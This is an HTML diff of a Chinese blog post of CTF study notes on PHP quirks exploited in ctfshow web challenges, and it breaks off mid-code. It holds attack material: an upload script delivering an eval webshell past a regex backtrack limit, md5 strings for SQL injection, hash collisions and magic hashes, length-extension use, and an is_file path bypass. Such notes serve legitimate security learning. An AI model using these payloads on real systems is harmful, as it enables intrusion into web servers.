@@ -1,0 +1,1570 @@
+<!doctype html>
+<html
+  lang="zh-CN" 
+  data-theme-mode="auto"
+  >
+  <head><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  Ctfshow_php | Lier
+</title>
+<meta
+  name="description"
+  content="ctfshow里web入门php特性的总结"
+/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://www.lier.xin/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+  window.siteConfig.swPath = '\/sw.js';
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="Ctfshow_php | Lier" />
+  <meta
+    property="og:description"
+    content="ctfshow里web入门php特性的总结"
+  />
+  <meta property="og:url" content="https://www.lier.xin/post/ctfshow_php/" />
+  <meta
+    property="og:site_name"
+    content="Only_ONE"
+  />
+  <meta
+    property="og:image"
+    content="/images/ctfshow.png"
+  />
+  <meta property="article:author" content="Lier" />
+  <meta property="article:published_time" content="2025-07-22T18:31:50&#43;08:00" />
+  <meta property="article:modified_time" content="2025-07-22T18:31:50&#43;08:00" /><meta property="article:tag" content="CTF_SHOWphp语言特性" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/images/ctfshow.png" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.ae1d908d7f5ff8dd2a7f8f641e49366762447f3ee446c7291525d8387ba34463.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.css"
+    integrity="sha384-5TcZemv2l/9On385z///&#43;d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css"
+    integrity="sha384-4NN3fZ5AokFyHuoihl7A9qWaCt&#43;HsAtOaUsXwJGRb4/SMBtFr2vcNSHR5E8dg0Wk" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script><div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="lang-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+本文章没有找到对应的语言版本
+</div><div class="notification-wrapper">
+    <h1>发现新版本</h1>
+    <p>网站好像有新内容，是否更新(ﾟ⊿ﾟ)ﾂ？</p>
+    <div class="notification-btn">
+      <button id="notification-update-btn">更新</button>
+      <button id="notification-close-btn">取消</button>
+    </div>
+  </div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav"><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/">首页</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span><a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a></nav></div>
+<header id="header"><picture></picture>
+    <img crossorigin="anonymous" fetchpriority="high" src="/images/ctfshow.png" alt="Ctfshow_php"><div id="header-outer">
+    <div id="header-title"><a href="/" id="logo">
+            <h1 data-aos="slide-up">Ctfshow_php</h1>
+          </a><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          class="sidebar-left"
+            ><aside id="sidebar"><div class="sidebar-wrapper wrap-sticky">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#php特性">php特性</a>
+      <ul>
+        <li><a href="#php函数">php函数</a></li>
+        <li><a href="#php原生类">php原生类</a></li>
+        <li><a href="#伪协议支持的协议和封装协议">伪协议（支持的协议和封装协议）</a></li>
+        <li><a href="#超全局变量">超全局变量</a></li>
+        <li><a href="#预定义常量">预定义常量</a></li>
+        <li><a href="#魔术常量">魔术常量</a></li>
+        <li><a href="#命令行">命令行</a></li>
+        <li><a href="#姿势收集">姿势收集</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Lier"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Lier</div>
+  <div class="sidebar-description">溯本求源，大道至简</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">28</div>
+  </div>
+</div>
+<div class="sidebar-social"><div class="icon-email sidebar-social-icon">
+      <a
+        href="3310338687@qq.com"
+        itemprop="url"
+        target="_blank"
+        aria-label="email"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/lierbushiwo"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div>
+
+  <div class="sidebar-widget"></div></aside>
+<section id="main"><article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-07-22 18:31:50 &#43;0800 &#43;08" itemprop="datePublished"
+      >2025-07-22</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-07-22</time
+    >
+  </span>
+</div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/learning"
+      data-aos="zoom-in"
+      >LEARNING</a
+    ></div>
+</div>
+    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="php特性">
+<a class="header-anchor" href="#php%e7%89%b9%e6%80%a7"></a>
+php特性
+</h2><p>1、0e开头的字符串若全为数字，强弱都相等</p>
+<p>2、数组溢出，数组的最多有<code>PHP_INT_MAX</code>个元素，添加最大索引后继续追加就会引起数组溢出，导致赋值式为false</p>
+<p>3、 PHP的函数具有词法作用域,$GLOBALS — 引用全局作用域中可用的全部变量</p>
+<p>4、字母开头字符串和数字弱比较相当于0和后边比较</p>
+<p>5、PHP对无法使用的filter过滤器只会抛出warning而不是error</p>
+<p>6、<code>php</code>中<code>-&gt;</code>用于访问类的实例成员（属性和方法），我们需要先实例化类，然后通过实例对象来调用其成员；而 <code>::</code>用于访问类的静态成员（静态属性和静态方法）和常量，静态成员属于类本身，而不是任何具体实例，因此不需要实例化类即可调用它们。</p>
+<p>7、数字是可以和命令进行一些运算<code>1-phpinfo();</code>可以正常执行，<code>+ - * |</code></p>
+<p>8、<code>eval</code>中支持<code>?&gt;</code>php标识符</p>
+<p>9、php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</p>
+<p>10、在 PHP 7.1 + 的版本中, 对属性类型 (public protected private) 不敏感</p>
+<p>因为 protected 和 private 反序列化后的结果中含有 <code>%00</code>, 部分题目会禁止这种字符, 可在构造 payload 时将属性全部改成 public 来绕过限制</p>
+<h3 id="php函数">
+<a class="header-anchor" href="#php%e5%87%bd%e6%95%b0"></a>
+php函数
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">implode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">get_defined_vars</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span>
+</span></span><span class="line"><span class="cl"><span class="n">print_r</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">scandir</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">base64_encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">readfile</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">highlight_file</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin2hex</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">hex2bin</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">intval</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">extract</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">parse_str</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">var_export</span><span class="p">()</span>
+</span></span></code></pre></div><h4 id="preg_match">
+<a class="header-anchor" href="#preg_match"></a>
+preg_match()
+</h4><p>1、preg_match函数传入的参数只能是字符串，如果传入数组这种会报错，返回FALSE</p>
+<p>2、<code>/m</code>模式支持多行匹配</p>
+<p>3、正则最大回溯次数</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PHP为了防止正则表达式的拒绝服务击(reDOS),给pcre设定了一个回溯次数上限pcre.backtrack_limit
+</span></span><span class="line"><span class="cl">回溯次数上限默认是100万。如果回溯次数超过了100万，preg_match将不再返回非1和0，而false,
+</span></span><span class="line"><span class="cl">这样就可以绕过第一个正则表达式
+</span></span></code></pre></div><p>exp.py</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://xxx.xxx.xxx/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;aaa&lt;?php eval($_POST[1]);//&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1000000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
+</span></span></code></pre></div><h4 id="intval">
+<a class="header-anchor" href="#intval"></a>
+intval()
+</h4><p>1、intval中输入数组，返回的值只看数组是否为空，为空返回0，否则返回1</p>
+<p>2、<code>intval($value,$base)</code>中<code>base</code>默认为10进制，若为0，通过检测 value 的格式来决定使用的进制</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250708215339881.png" alt="image-20250708215339825"></p>
+<p>3、<code>intval</code>返回变量 <code>value</code> 的 <a href="https://www.php.net/manual/zh/language.types.integer.php">int</a> 数值，忽略小数点后的数据</p>
+<p>4、<code>intval</code>会自动忽略空格和换行符<code>%20 %2b %0a %09</code></p>
+<p>5、识别科学计数法，低版本的<code>intval</code>不支持科学计数法</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">php &gt; var_dump<span class="o">(</span>intval<span class="o">(</span>4476e0<span class="o">))</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">int<span class="o">(</span>4476<span class="o">)</span>
+</span></span></code></pre></div><p>6、支持先运算，后转换</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span> <span class="o">&gt;</span> <span class="n">var_dump</span><span class="p">(</span><span class="n">intval</span><span class="p">(</span><span class="mi">4477</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="ne">int</span><span class="p">(</span><span class="mi">4476</span><span class="p">)</span>
+</span></span></code></pre></div><p>7、字符串,数字开头只取前边数字，字母开头为0</p>
+<h4 id="strpos">
+<a class="header-anchor" href="#strpos"></a>
+strpos()
+</h4><p>查找字符串首次出现的位置，索引从0开始</p>
+<p>找不到字符返回false</p>
+<h4 id="highlight_file">
+<a class="header-anchor" href="#highlight_file"></a>
+highlight_file（）
+</h4><p>1、支持相对路径
+2、支持文件流式读取文件（伪协议）</p>
+<h4 id="md5">
+<a class="header-anchor" href="#md5"></a>
+md5()
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">md5(string $string, bool $binary = false): string
+</span></span><span class="line"><span class="cl">1、第二个参数默认为false，为true时 md5 摘要将以 16 字符长度的原始二进制格式返回
+</span></span><span class="line"><span class="cl">2、第一个参数只接受字符，不接受int类型
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250709214944562.png" alt="image-20250709214944505"></p>
+<p>1、处理数组时,返回值为<code>NULL</code>
+2、第二个参数为true时可搭配sql注入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ffifdyop
+</span></span><span class="line"><span class="cl">4SV7p
+</span></span><span class="line"><span class="cl">bJm4aG
+</span></span><span class="line"><span class="cl">bNas5p
+</span></span><span class="line"><span class="cl">ckHAEb
+</span></span><span class="line"><span class="cl">129581926211651571912466741651878684928
+</span></span></code></pre></div><p>3、加密后为<code>0e</code>开头,需要注意的地方是，这个以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">QNKCDZO   aabg7XSs
+</span></span><span class="line"><span class="cl">s878926199a
+</span></span><span class="line"><span class="cl">s155964671a
+</span></span><span class="line"><span class="cl">s214587387a
+</span></span><span class="line"><span class="cl">QLTHNDT
+</span></span><span class="line"><span class="cl">QNKCDZO
+</span></span><span class="line"><span class="cl">EEIZDOI
+</span></span><span class="line"><span class="cl">240610708
+</span></span></code></pre></div><p>4、双md5（MD5和双MD5以后的值都是0e开头的）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CbDLytmyGm2xQyaLNhWn
+</span></span><span class="line"><span class="cl">770hQgrBOjrcqftrlaZk
+</span></span><span class="line"><span class="cl">7r4lGXCH2Ksu2JNT3BYM
+</span></span></code></pre></div><p>5、0e开头加密后还为0e开头</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-p" data-lang="p"><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">00275209979</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">551387587965716321018342879905</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">00506035745</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">224441551631909369101555335043</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">00540451811</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">057099852684304412663796608095</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">00678205148</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">934049274119262631743072394111</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">00741250258</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">899567782965109269932883593603</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">00928251504</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">148856674729228041723861799600</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">01350016114</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">769018222125751782256460324867</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">01352028862</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">388419153010508575572061606161</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">01392313004</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">793314107039222217518920037885</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">01875552079</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">780449305367629893512581736357</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">01975903983</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">317084484960342086618161584202</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">02042356163</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">335912055437180460060141819624</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">02218562930</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">151492820470888772364059321579</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">02451355147</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">866503534356013079241759641492</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">02739970294</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">894318228115677783240047043017</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">02760920150</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">413159393756646578537635311046</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">02784726287</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">433955189140949269100965859496</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">03298616350</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">851613188370453906408258609284</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nv">e</span><span class="mi">03393034171</span> <span class="mi">0</span><span class="nv">e</span><span class="mi">077847024281996293485700020358</span>
+</span></span></code></pre></div><p>6、强碰撞</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">param1=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+</span></span><span class="line"><span class="cl">&amp;param2=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
+</span></span></code></pre></div><p>7、md5长度拓展攻击</p>
+<p><code>$value=md5($key+$data)</code></p>
+<p>已知<code>$value length($key) $data</code></p>
+<p>可得到一组数据，满足<code>$_value=md5($key+$_data)</code>,其中新的到的数据为<code>$_value $_date</code></p>
+<p>使用工具<code>hash-ext-attack</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">E:<span class="se">\t</span>ools<span class="se">\h</span>ash-ext-attack&gt;python hash_ext_attack.py
+</span></span><span class="line"><span class="cl">2025-07-09 22:25:02.010 <span class="p">|</span> DEBUG    <span class="p">|</span> common.md5_manual:__init__:17 - init......
+</span></span><span class="line"><span class="cl">请输入已知明文：adminroot
+</span></span><span class="line"><span class="cl">请输入已知hash： e6ccbf12de9d33ec27a5bcfb6a3293df
+</span></span><span class="line"><span class="cl">请输入扩展字符:
+</span></span><span class="line"><span class="cl">请输入密钥长度：14
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">其中扩展字符填不填没影响
+</span></span></code></pre></div><h4 id="sha1">
+<a class="header-anchor" href="#sha1"></a>
+sha1()
+</h4><p>1、数组返回为NULL</p>
+<p>2、加密后为<code>0e</code>开头</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aaO8zKZF aaK1STfY
+</span></span></code></pre></div><h4 id="in_array">
+<a class="header-anchor" href="#in_array"></a>
+in_array()
+</h4><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250710230215334.png" alt="image-20250710230215232"></p>
+<p>1、不设置第三个参数时为弱比较</p>
+<h4 id="parse_str">
+<a class="header-anchor" href="#parse_str"></a>
+parse_str()
+</h4><p><code>parse_str($string,$result)</code></p>
+<p>如果 string 是通过 URL 传入的查询字符串，则将其解析，并将 key 设置到指定 result 数组中。如果未提供 result 数组，则会将值设置为当前作用域中的变量。</p>
+<h4 id="ereg">
+<a class="header-anchor" href="#ereg"></a>
+ereg()
+</h4><p>1、00截断<code>%00</code></p>
+<h4 id="is_file">
+<a class="header-anchor" href="#is_file"></a>
+is_file()
+</h4><p>1、超过is_file能处理的最大长度就不认为是个文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span 